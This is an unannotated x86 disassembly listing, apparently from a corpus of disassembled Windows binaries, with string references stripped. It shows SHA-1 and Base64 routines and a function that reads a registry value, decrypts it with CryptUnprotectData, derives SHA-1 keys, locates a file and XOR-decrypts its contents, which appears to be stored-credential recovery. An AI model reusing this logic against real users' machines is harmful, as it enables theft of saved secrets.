mov ecx [ eax + 0x24 ]
xor ecx [ eax + 0x4 ]
mov esi edx
xor ecx [ eax + 0x18 ]
rol esi 0x5
ror [ ebp - 0x10 ] 0x2
xor ecx [ eax + 0x2c ]
lea esi [ edi + esi - 0x70e44324 ]
rol ecx 0x1
mov edi edx
or edi [ ebp - 0x10 ]
mov ebx edx
and edi [ ebp - 0x4 ]
and ebx [ ebp - 0x10 ]
mov [ eax + 0x24 ] ecx
or edi ebx
add edi ecx
add edi [ ebp - 0x8 ]
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x28 ]
mov [ ebp - 0xc ] esi
xor ecx [ eax + 0x8 ]
rol esi 0x5
xor ecx [ eax + 0x1c ]
ror edx 0x2
lea esi [ edi + esi - 0x70e44324 ]
mov edi edx
or edi [ ebp - 0xc ]
rol ecx 0x1
and edi [ ebp - 0x10 ]
mov [ ebp - 0x8 ] esi
mov ebx edx
rol esi 0x5
and ebx [ ebp - 0xc ]
mov [ eax + 0x28 ] ecx
or edi ebx
add edi ecx
add edi [ ebp - 0x4 ]
ror [ ebp - 0xc ] 0x2
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x34 ]
lea esi [ edi + esi - 0x70e44324 ]
xor ecx [ eax + 0x2c ]
mov edi [ ebp - 0xc ]
or edi [ ebp - 0x8 ]
xor ecx [ eax + 0xc ]
mov ebx [ ebp - 0xc ]
and ebx [ ebp - 0x8 ]
and edi edx
rol ecx 0x1
or edi ebx
add edi ecx
add edi [ ebp - 0x10 ]
mov [ eax + 0x2c ] ecx
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x10 ]
mov [ ebp - 0x4 ] esi
xor ecx [ eax + 0x24 ]
rol esi 0x5
xor ecx [ eax + 0x38 ]
ror [ ebp - 0x8 ] 0x2
lea esi [ edi + esi - 0x70e44324 ]
mov edi [ ebp - 0xc ]
xor edi [ ebp - 0x8 ]
rol ecx 0x1
xor edi [ ebp - 0x4 ]
mov [ eax + 0x30 ] ecx
add edi ecx
mov ecx [ eax + 0x34 ]
xor ecx [ eax + 0x14 ]
add edi edx
xor ecx [ eax + 0x28 ]
mov [ ebp - 0x10 ] esi
xor ecx [ eax + 0x3c ]
rol esi 0x5
ror [ ebp - 0x4 ] 0x2
lea esi [ edi + esi - 0x359d3e2a ]
mov edi [ ebp - 0x8 ]
xor edi [ ebp - 0x4 ]
rol ecx 0x1
xor edi [ ebp - 0x10 ]
mov [ eax + 0x34 ] ecx
add edi ecx
add edi [ ebp - 0xc ]
mov ecx [ eax + 0x38 ]
xor ecx [ eax ]
mov edx esi
xor ecx [ eax + 0x18 ]
mov [ ebp + 0xc ] esi
xor ecx [ eax + 0x2c ]
xor esi [ ebp - 0x4 ]
rol edx 0x5
ror [ ebp - 0x10 ] 0x2
xor esi [ ebp - 0x10 ]
rol ecx 0x1
add esi ecx
add esi [ ebp - 0x8 ]
lea edx [ edi + edx - 0x359d3e2a ]
mov [ eax + 0x38 ] ecx
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x4 ]
mov edi edx
xor ecx [ eax + 0x3c ]
rol edi 0x5
ror [ ebp + 0xc ] 0x2
xor ecx [ eax + 0x1c ]
lea esi [ esi + edi - 0x359d3e2a ]
mov edi [ ebp + 0xc ]
xor edi edx
xor edi [ ebp - 0x10 ]
rol ecx 0x1
mov [ ebp - 0x8 ] esi
add edi ecx
rol esi 0x5
add edi [ ebp - 0x4 ]
mov [ eax + 0x3c ] ecx
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x34 ]
lea esi [ edi + esi - 0x359d3e2a ]
xor ecx [ eax ]
mov edi [ ebp + 0xc ]
xor ecx [ eax + 0x8 ]
ror edx 0x2
xor edi edx
xor edi [ ebp - 0x8 ]
rol ecx 0x1
add edi ecx
add edi [ ebp - 0x10 ]
mov [ eax ] ecx
mov ecx [ eax + 0x24 ]
xor ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] esi
xor ecx [ eax + 0x38 ]
rol esi 0x5
xor ecx [ eax + 0xc ]
ror [ ebp - 0x8 ] 0x2
rol ecx 0x1
lea esi [ edi + esi - 0x359d3e2a ]
mov edi [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
mov [ ebp - 0xc ] edx
xor edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] esi
xor edx [ ebp - 0x4 ]
rol esi 0x5
add edx ecx
add edx [ ebp + 0xc ]
ror [ ebp - 0x4 ] 0x2
xor edi [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
xor ecx [ eax + 0x28 ]
xor edi [ ebp - 0x10 ]
xor ecx [ eax + 0x8 ]
lea edx [ edx + esi - 0x359d3e2a ]
xor ecx [ eax + 0x3c ]
mov esi edx
rol ecx 0x1
add edi ecx
add edi [ ebp - 0xc ]
rol esi 0x5
ror [ ebp - 0x10 ] 0x2
lea esi [ edi + esi - 0x359d3e2a ]
mov edi [ eax ]
mov [ eax + 0x8 ] ecx
mov ecx [ eax + 0x14 ]
xor ecx edi
xor ecx [ eax + 0x2c ]
mov edi edx
xor edi [ ebp - 0x4 ]
xor ecx [ eax + 0xc ]
xor edi [ ebp - 0x10 ]
rol ecx 0x1
add edi ecx
add edi [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x10 ]
mov [ ebp - 0xc ] esi
xor ecx [ eax + 0x4 ]
rol esi 0x5
xor ecx [ eax + 0x18 ]
lea esi [ edi + esi - 0x359d3e2a ]
ror edx 0x2
mov edi edx
xor edi [ ebp - 0xc ]
rol ecx 0x1
xor edi [ ebp - 0x10 ]
mov [ ebp - 0x8 ] esi
add edi ecx
add edi [ ebp - 0x4 ]
rol esi 0x5
ror [ ebp - 0xc ] 0x2
lea esi [ edi + esi - 0x359d3e2a ]
mov [ eax + 0x10 ] ecx
mov ecx [ eax + 0x34 ]
mov [ ebp + 0xc ] edx
mov [ ebp - 0x4 ] esi
xor ecx [ eax + 0x14 ]
xor edx [ ebp - 0xc ]
xor ecx [ eax + 0x8 ]
xor edx [ ebp - 0x8 ]
xor ecx [ eax + 0x1c ]
mov edi [ ebp - 0xc ]
rol ecx 0x1
add edx ecx
add edx [ ebp - 0x10 ]
mov [ eax + 0x14 ] ecx
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x38 ]
rol esi 0x5
xor ecx [ eax + 0x18 ]
ror [ ebp - 0x8 ] 0x2
xor edi [ ebp - 0x8 ]
xor ecx [ eax + 0xc ]
xor edi [ ebp - 0x4 ]
rol ecx 0x1
add edi ecx
add edi [ ebp + 0xc ]
mov [ eax + 0x18 ] ecx
mov ecx [ eax + 0x10 ]
xor ecx [ eax + 0x24 ]
lea edx [ edx + esi - 0x359d3e2a ]
xor ecx [ eax + 0x3c ]
mov esi edx
xor ecx [ eax + 0x1c ]
rol esi 0x5
ror [ ebp - 0x4 ] 0x2
lea esi [ edi + esi - 0x359d3e2a ]
mov edi [ ebp - 0x8 ]
xor edi [ ebp - 0x4 ]
rol ecx 0x1
xor edi edx
add edi ecx
add edi [ ebp - 0xc ]
mov [ eax + 0x1c ] ecx
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x14 ]
mov [ ebp + 0xc ] esi
xor ecx [ eax ]
rol esi 0x5
xor ecx [ eax + 0x28 ]
lea esi [ edi + esi - 0x359d3e2a ]
mov edi [ ebp + 0xc ]
xor edi [ ebp - 0x4 ]
ror edx 0x2
rol ecx 0x1
xor edi edx
add edi ecx
add edi [ ebp - 0x8 ]
mov [ eax + 0x20 ] ecx
mov ecx [ eax + 0x24 ]
xor ecx [ eax + 0x4 ]
mov [ ebp - 0xc ] esi
xor ecx [ eax + 0x18 ]
rol esi 0x5
ror [ ebp + 0xc ] 0x2
xor ecx [ eax + 0x2c ]
lea esi [ edi + esi - 0x359d3e2a ]
mov edi [ ebp + 0xc ]
xor edi [ ebp - 0xc ]
rol ecx 0x1
xor edi edx
add edi ecx
add edi [ ebp - 0x4 ]
mov [ eax + 0x24 ] ecx
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x28 ]
mov [ ebp - 0x8 ] esi
xor ecx [ eax + 0x8 ]
rol esi 0x5
xor ecx [ eax + 0x1c ]
ror [ ebp - 0xc ] 0x2
mov [ ebp - 0x10 ] edx
lea edx [ edi + esi - 0x359d3e2a ]
rol ecx 0x1
mov esi edx
mov [ eax + 0x28 ] ecx
rol esi 0x5
mov edi [ ebp + 0xc ]
xor edi [ ebp - 0xc ]
xor edi [ ebp - 0x8 ]
add edi ecx
add edi [ ebp - 0x10 ]
ror [ ebp - 0x8 ] 0x2
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x34 ]
lea esi [ edi + esi - 0x359d3e2a ]
xor ecx [ eax + 0x2c ]
mov edi [ ebp - 0xc ]
xor ecx [ eax + 0xc ]
xor edi [ ebp - 0x8 ]
rol ecx 0x1
xor edi edx
add edi ecx
add edi [ ebp + 0xc ]
mov [ eax + 0x2c ] ecx
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x10 ]
mov [ ebp - 0x10 ] esi
xor ecx [ eax + 0x24 ]
rol esi 0x5
xor ecx [ eax + 0x38 ]
ror edx 0x2
rol ecx 0x1
lea esi [ edi + esi - 0x359d3e2a ]
mov edi [ ebp - 0x8 ]
xor edi edx
xor edi [ ebp - 0x10 ]
mov [ eax + 0x30 ] ecx
add edi ecx
add edi [ ebp - 0xc ]
mov ecx [ eax + 0x34 ]
xor ecx [ eax + 0x14 ]
mov [ ebp + 0xc ] esi
xor ecx [ eax + 0x28 ]
mov ebx [ ebp + 0xc ]
xor ecx [ eax + 0x3c ]
xor ebx edx
rol esi 0x5
ror [ ebp - 0x10 ] 0x2
xor ebx [ ebp - 0x10 ]
rol ecx 0x1
add ebx ecx
add ebx [ ebp - 0x8 ]
mov [ eax + 0x34 ] ecx
mov ecx [ eax + 0x38 ]
xor ecx [ eax ]
lea esi [ edi + esi - 0x359d3e2a ]
xor ecx [ eax + 0x18 ]
mov edi esi
xor ecx [ eax + 0x2c ]
rol edi 0x5
ror [ ebp + 0xc ] 0x2
rol ecx 0x1
mov [ ebp - 0x4 ] edx
lea edx [ ebx + edi - 0x359d3e2a ]
mov ebx [ ebp + 0xc ]
xor ebx esi
xor ebx [ ebp - 0x10 ]
mov [ eax + 0x38 ] ecx
add ebx ecx
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x4 ]
add ebx [ ebp - 0x4 ]
xor ecx [ eax + 0x3c ]
mov edi edx
xor ecx [ eax + 0x1c ]
rol edi 0x5
mov [ ebp - 0xc ] esi
ror [ ebp - 0xc ] 0x2
lea esi [ ebx + edi - 0x359d3e2a ]
mov edi [ ebp + 0xc ]
rol ecx 0x1
mov [ eax + 0x3c ] ecx
mov ebx edi
xor ebx [ ebp - 0xc ]
mov eax esi
rol eax 0x5
xor ebx edx
add ebx ecx
add ebx [ ebp - 0x10 ]
lea ecx [ ebx + eax - 0x359d3e2a ]
mov eax [ ebp + 0x8 ]
add [ eax ] ecx
add [ eax + 0x4 ] esi
mov ecx [ ebp - 0xc ]
add [ eax + 0xc ] ecx
ror edx 0x2
add [ eax + 0x8 ] edx
add [ eax + 0x10 ] edi
pop edi
pop esi
pop ebx
leave
retn
sub_40a030
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x14 ]
mov eax ecx
shr eax 0x3
mov edx ebx
lea ecx [ ecx + ebx * 8 ]
shl edx 0x3
and eax 0x3f
cmp ecx edx
push edi
mov [ esi + 0x14 ] ecx
jae r-xdata
mov ecx ebx
shr ecx 0x1d
add [ esi + 0x18 ] ecx
lea ecx [ eax + ebx ]
cmp ecx 0x3f
jbe r-xdata
inc [ esi + 0x18 ]
xor edi edi
push 0x40
pop edi
sub edi eax
push edi
push [ ebp + 0xc ]
lea eax [ eax + esi + 0x1c ]
push eax
call sub_4110cf
lea eax [ esi + 0x1c ]
push eax
push esi
call sub_408f95
lea eax [ edi + 0x3f ]
add esp 0x14
cmp eax ebx
jae r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
sub ebx edi
push ebx
add edi ecx
lea eax [ eax + esi + 0x1c ]
push edi
push eax
call sub_4110cf
add esp 0xc
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
lea eax [ eax + ecx - 0x3f ]
push eax
push esi
call sub_408f95
add [ ebp + 0x8 ] 0x40
pop ecx
add edi 0x40
cmp [ ebp + 0x8 ] ebx
pop ecx
jb r-xdata
sub_40a0d3
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0xc ]
push edi
xor eax eax
push 0x3
mov edx eax
pop ecx
and edx ecx
sub ecx edx
shl ecx 0x3
cmp eax 0x4
sbb edx edx
neg edx
mov edx [ esi + edx * 4 + 0x14 ]
shr edx cl
inc eax
cmp eax 0x8
mov [ ebp + eax - 0x9 ] dl
jb r-xdata
push ebx
push 0x1
push r--data
push esi
call sub_40a030
lea eax [ esi + 0x14 ]
mov ebx 0x1f8
mov [ ebp + 0xc ] eax
lea edi [ ebx - 0x38 ]
jmp r-xdata
mov eax [ eax ]
and eax ebx
add esp 0xc
cmp eax edi
jne r-xdata
push 0x1
push r--data
push esi
call sub_40a030
mov eax [ ebp + 0xc ]
push 0x8
lea eax [ ebp - 0x8 ]
push eax
push esi
call sub_40a030
add esp 0xc
xor edi edi
xor eax eax
pop ebx
push 0x3
mov edx eax
pop ecx
and edx ecx
sub ecx edx
mov edx eax
shr edx 0x2
mov edx [ esi + edx * 4 ]
shl ecx 0x3
shr edx cl
mov ecx [ ebp + 0x8 ]
mov [ eax + ecx ] dl
inc eax
cmp eax 0x14
jb r-xdata
push 0x40
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_41112d
push 0x14
push edi
push esi
call sub_41112d
push 0x8
push edi
push [ ebp + 0xc ]
call sub_41112d
push 0x8
lea eax [ ebp - 0x8 ]
push edi
push eax
call sub_41112d
add esp 0x30
pop edi
pop esi
leave
retn
sub_40a1a4
push ebp
mov ebp esp
sub esp 0x630
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x44 ]
call sub_40eb9e
call sub_40f095
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] esp
mov [ ebp - 0x18 ] ebp
lea eax [ ebp - 0xc ]
push eax
call sub_40f06f
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0xc ]
pop ecx
mov [ ebp - 0x5c ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] sub_40f09c
lea eax [ ebp - 0x64 ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x28 ]
push eax
push 0x1
xor ebx ebx
push ebx
push r--data
mov edi 0x200
push 0x80000001
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1c ] ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x44 ]
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
mov esi rw-data
push esi
lea eax [ ebp - 0x90 ]
push eax
push ebx
push r--data
push [ ebp - 0x28 ]
call [ RegQueryValueExA@IAT ]
test eax eax
push [ ebp - 0x28 ]
je r-xdata
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x50 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x7c ] esi
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
call [ RegCloseKey@IAT ]
jmp r-xdata
push edi
push ebx
push esi
mov [ ebp - 0x8 ] 0x20
call sub_41112d
lea eax [ ebp - 0x100 ]
push eax
xor edi edi
call sub_40a001
push 0x4
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_40a030
push [ ebp - 0x50 ]
lea eax [ ebp - 0x100 ]
push [ ebp - 0x4c ]
push eax
call sub_40a030
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0xa4 ]
push eax
call sub_40a0d3
add esp 0x30
cmp [ ebp - 0x8 ] 0x14
jbe r-xdata
push [ ebp - 0x8 ]
imul edi edi 0x14
lea eax [ ebp - 0xa4 ]
push eax
add edi esi
push edi
call sub_4110cf
push esi
lea eax [ ebp - 0x630 ]
push 0x20
push eax
call sub_40861d
add esp 0x18
push [ ebp - 0x4c ]
call [ LocalFree@IAT ]
push 0x102
lea eax [ ebp - 0x448 ]
push eax
push r--data
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x10 ] esi
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x48 ] eax
je r-xdata
push 0x14
lea eax [ ebp - 0xa4 ]
push eax
push [ ebp - 0x10 ]
call sub_4110cf
add [ ebp - 0x10 ] 0x14
sub [ ebp - 0x8 ] 0x14
lea eax [ ebp - 0x100 ]
push eax
inc edi
call sub_40a001
mov eax edi
and eax 0xff0000
mov ecx edi
shr ecx 0x10
or eax ecx
mov ecx edi
shl ecx 0x10
mov edx edi
and edx 0xff00
shr eax 0x8
or ecx edx
shl ecx 0x8
or eax ecx
mov [ ebp - 0x4 ] eax
push 0x4
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_40a030
push [ ebp - 0x50 ]
lea eax [ ebp - 0x100 ]
push [ ebp - 0x4c ]
push eax
call sub_40a030
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0xa4 ]
push eax
call sub_40a0d3
add esp 0x30
cmp [ ebp - 0x8 ] 0x14
ja r-xdata
mov edi rw-data
lea eax [ ebp - 0x240 ]
push eax
push [ ebp - 0x48 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
je r-xdata
test [ ebp - 0x240 ] 0x10
je r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x48 ]
mov esi eax
call [ FindClose@IAT ]
cmp esi 0x12
jne r-xdata
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x64 ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x448 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x344 ]
push eax
call [ lstrlenA@IAT ]
mov esi [ lstrcatA@IAT ]
lea ecx [ ebp - 0x344 ]
dec ecx
mov [ eax + ecx ] bl
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x344 ]
push eax
call esi
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
lea eax [ ebp - 0x344 ]
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x24 ] eax
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
push ebx
push eax
call [ GetFileSize@IAT ]
push ebx
mov esi eax
push esi
push ebx
push 0x2
push ebx
push [ ebp - 0x24 ]
call [ CreateFileMappingA@IAT ]
cmp eax ebx
mov [ ebp - 0x1c ] eax
je r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x20 ]
call [ UnmapViewOfFile@IAT ]
mov [ ebp - 0x20 ] ebx
push esi
push ebx
push ebx
push 0x4
push eax
call [ MapViewOfFile@IAT ]
cmp eax ebx
mov [ ebp - 0x20 ] eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x1c ] ebx
push r--data
push eax
call sub_41188f
cmp eax ebx
pop ecx
pop ecx
mov [ ebp - 0x10 ] eax
je r-xdata
push [ ebp - 0x24 ]
call [ CloseHandle@IAT ]
push r--data
push eax
call sub_41188f
cmp eax ebx
pop ecx
pop ecx
je r-xdata
mov esi eax
sub esi [ ebp - 0x10 ]
push r--data
call sub_411738
pop ecx
mov ecx esi
sub ecx eax
mov eax 0x4b4
cmp ecx eax
ja r-xdata
push eax
push ebx
push edi
call sub_41112d
push r--data
call sub_411738
add esp 0x10
sub esi eax
push esi
push r--data
call sub_411738
add eax [ ebp - 0x10 ]
pop ecx
push eax
push edi
call [ lstrcpynA@IAT ]
push 0x3
lea eax [ ebp - 0x2c ]
push ebx
push eax
call sub_41112d
push edi
xor esi esi
mov [ ebp - 0x4 ] ebx
call sub_411738
add esp 0x10
test eax eax
jbe r-xdata
mov eax [ ebp - 0x4 ]
cmp eax ebx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] ebx
jbe r-xdata
push 0x2
lea eax [ esi + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_4110cf
push 0x10
lea eax [ ebp - 0x2c ]
push ebx
push eax
call j_sub_411ad7
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
inc esi
push edi
mov [ ecx + rw-data ] al
inc esi
call sub_411738
add esp 0x1c
cmp esi eax
jb r-xdata
inc [ rw-data ]
lea eax [ ebp - 0x8c ]
push eax
push [ rw-data ]
call sub_40df39
pop ecx
pop ecx
lea eax [ ebp - 0x8c ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x44 ]
call sub_40ec7e
lea eax [ ebp - 0x214 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x44 ]
call sub_40ec7e
push rw-data
push 0x25a
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x44 ]
call sub_40ec7e
mov eax [ ebp - 0x10 ]
mov ecx eax
mov edx eax
shr edx 0x10
and ecx 0xff0000
or ecx edx
mov edx eax
and eax 0xff00
shl edx 0x10
or edx eax
lea eax [ ebp - 0x78 ]
push eax
push eax
shr ecx 0x8
shl edx 0x8
lea eax [ ebp - 0x630 ]
or ecx edx
push eax
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x6c ] ecx
call sub_408856
mov esi [ ebp - 0x4 ]
mov eax [ rw-data ]
lea ecx [ esi + 0x10 ]
add esp 0xc
cmp ecx eax
mov [ ebp - 0x68 ] ecx
jae r-xdata
mov ecx eax
sub ecx esi
push 0x10
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x68 ]
inc [ ebp - 0x10 ]
cmp ecx eax
mov [ ebp - 0x4 ] ecx
jb r-xdata
lea esi [ esi + rw-data ]
cmp ecx ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
jbe r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ ebp + edx - 0x78 ]
xor [ esi ] dl
inc [ ebp - 0x4 ]
inc esi
cmp [ ebp - 0x4 ] ecx
jb r-xdata
sub_40a77b
push ebp
mov ebp esp
sub esp 0x38
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
push r--data
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
sub esp 0x10
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x1d ]
push eax
sub esp 0x10
lea eax [ ebp + 0xc ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x2a ]
push eax
sub esp 0x10
lea eax [ ebp + 0xc ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x37 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_40f70c
mov ecx eax
call sub_40f70c
mov ecx eax
call sub_40f70c
mov ecx eax
call sub_40f74e
lea ecx [ ebp - 0x1d ]
call sub_40f609
lea ecx [ ebp - 0x2a ]
call sub_40f609
lea ecx [ ebp - 0x37 ]
call sub_40f609
xor esi esi
cmp edi esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x8 ] esi
je r-xdata
push [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_40f3ae
lea ecx [ ebp + 0xc ]
call sub_40f609
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x10 ]
lea ecx [ ebp + 0xc ]
dec edi
call sub_40f627
mov al [ eax ]
mov [ ebp + esi - 0x4 ] al
mov bl [ ebp - 0x3 ]
inc esi
inc [ ebp - 0x10 ]
cmp esi 0x3
jne r-xdata
test edi edi
jne r-xdata
mov al [ ebp - 0x4 ]
shr al 0x2
mov [ ebp - 0xc ] al
mov al [ ebp - 0x4 ]
and al 0x3
shl al 0x4
mov cl bl
shr cl 0x4
add al cl
mov cl [ ebp - 0x2 ]
mov [ ebp - 0xb ] al
mov al bl
and al 0xf
shl al 0x2
shr cl 0x6
add al cl
mov [ ebp - 0xa ] al
mov al [ ebp - 0x2 ]
and al 0x3f
mov [ ebp - 0x9 ] al
xor esi esi
cmp esi edi
je r-xdata
push [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_40f627
movzx ecx [ ebp + esi - 0xc ]
inc [ ebp - 0x8 ]
mov cl [ ecx + r--data ]
inc esi
cmp esi 0x4
mov [ eax ] cl
jl r-xdata
xor esi esi
cmp esi 0x3
jge r-xdata
mov al [ ebp - 0x4 ]
mov cl al
shr cl 0x2
mov [ ebp - 0xc ] cl
and al 0x3
mov cl bl
shl al 0x4
shr cl 0x4
add al cl
mov [ ebp - 0xb ] al
mov al [ ebp - 0x2 ]
and bl 0xf
mov cl al
shl bl 0x2
shr cl 0x6
add bl cl
mov [ ebp - 0xa ] bl
and al 0x3f
lea ebx [ esi + 0x1 ]
test ebx ebx
mov [ ebp - 0x9 ] al
jle r-xdata
push 0x3
pop ecx
sub ecx esi
push ecx
lea eax [ ebp + esi - 0x4 ]
push edi
push eax
call sub_41112d
mov bl [ ebp - 0x3 ]
add esp 0xc
push 0x3
pop edi
cmp esi edi
jge r-xdata
push [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_40f627
movzx ecx [ ebp + edi - 0xc ]
inc [ ebp - 0x8 ]
mov cl [ ecx + r--data ]
inc edi
cmp edi ebx
mov [ eax ] cl
jl r-xdata
sub edi esi
push [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_40f627
inc [ ebp - 0x8 ]
dec edi
mov [ eax ] 0x3d
jne r-xdata
sub_40a955
test [ rw-data ] 0x1
jne r-xdata
movzx eax [ esp + 0x4 ]
push eax
push [ rw-data ]
call sub_411679
neg eax
pop ecx
sbb eax eax
pop ecx
neg eax
retn
or [ rw-data ] 0x1
push r--data
mov ecx rw-data
call sub_40f45c
push sub_412ce1
call sub_410891
pop ecx
sub_40a999
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
xor esi esi
and [ ebp - 0xc ] esi
call sub_40f5f9
test ebx ebx
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_40f609
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
leave
retn
push edi
test esi esi
je r-xdata
push [ ebp - 0xc ]
lea ecx [ ebp + 0xc ]
call sub_40f627
movzx eax [ eax ]
push eax
call sub_40a955
test al al
pop ecx
je r-xdata
pop edi
cmp esi 0x4
jge r-xdata
push [ ebp - 0xc ]
lea ecx [ ebp + 0xc ]
call sub_40f627
mov al [ eax ]
mov [ ebp + esi - 0x8 ] al
inc esi
inc [ ebp - 0xc ]
cmp esi 0x4
jne r-xdata
xor ebx ebx
push 0x4
pop ecx
sub ecx esi
push ecx
lea eax [ ebp + esi - 0x8 ]
push 0x0
push eax
call sub_41112d
add esp 0xc
test ebx ebx
jne r-xdata
xor edi edi
lea edi [ ebp + ebx - 0x8 ]
movzx eax [ edi ]
push eax
push r--data
call sub_40a93b
inc ebx
cmp ebx 0x4
pop ecx
pop ecx
mov [ edi ] al
jl r-xdata
mov al [ ebp - 0x7 ]
mov cl [ ebp - 0x8 ]
mov dl [ ebp - 0x7 ]
shr al 0x4
shl cl 0x2
and al 0x3
add al cl
mov [ ebp - 0x4 ] al
mov al [ ebp - 0x6 ]
mov cl al
shr cl 0x2
and cl 0xf
shl dl 0x4
shl al 0x6
add al [ ebp - 0x5 ]
xor cl dl
xor edi edi
dec esi
test esi esi
mov [ ebp - 0x3 ] cl
mov [ ebp - 0x2 ] al
jle r-xdata
push [ ebp - 0xc ]
lea ecx [ ebp + 0xc ]
dec ebx
call sub_40f627
cmp [ eax ] 0x3d
je r-xdata
lea esi [ ebp + edi - 0x8 ]
movzx eax [ esi ]
push eax
push r--data
call sub_40a93b
inc edi
cmp edi 0x4
pop ecx
pop ecx
mov [ esi ] al
jl r-xdata
mov al [ ebp - 0x7 ]
mov cl [ ebp - 0x8 ]
mov dl [ ebp - 0x7 ]
shr al 0x4
shl cl 0x2
and al 0x3
add al cl
mov [ ebp - 0x4 ] al
